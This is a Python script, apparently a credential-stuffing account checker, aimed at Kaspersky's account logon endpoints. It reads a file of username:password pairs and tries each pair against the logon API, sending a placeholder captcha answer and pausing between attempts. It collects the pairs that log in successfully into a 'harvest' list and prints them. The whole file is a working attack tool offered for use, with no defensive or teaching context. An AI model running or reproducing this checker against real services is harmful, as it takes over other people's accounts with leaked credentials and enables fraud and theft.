import requests
from bs4 import BeautifulSoup as scraper
import json
import sys
import os
import time

if len(sys.argv) == 1:
	print("usage: python3 KasperSky_LOGIN.py [FILE_PATH]")

start = "https://hq.uis.kaspersky.com/v3/logon/start"
proceed = "https://hq.uis.kaspersky.com/v3/logon/proceed"

header = {
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36'
}

realm = {
	'Realm': 'https://center.kaspersky.com/'
}

payload = {
	'locale': 'en',
	'captchaType': 'invisible_recaptcha',
	'captchaAnswer': 'undefined',
}

path = os.path.expanduser(sys.argv[1])
harvest = []

if os.path.exists(path):
	with open(path, 'r') as file:
		content = file.readlines()
		for line in content:
			print(line)
			data = line.strip().split(':')
			with requests.Session() as Session:
				response = Session.options(start)
				response = Session.post(start, json=realm)
				response_dict = json.loads(response.text)
				payload['logonContext'] = response_dict['LogonContext']
				payload['login'] = data[0]
				payload['password'] = data[1]
				response = Session.options(proceed)
				response = Session.post(proceed, json=payload)
				status_code = response.status_code
				if status_code == 200:
					harvest.append('{}:{}'.format(data[0], data[1]))
			time.sleep(2)
else:
	print("the filename `%s` does not exist, or is not readable." % (path))

print (harvest)
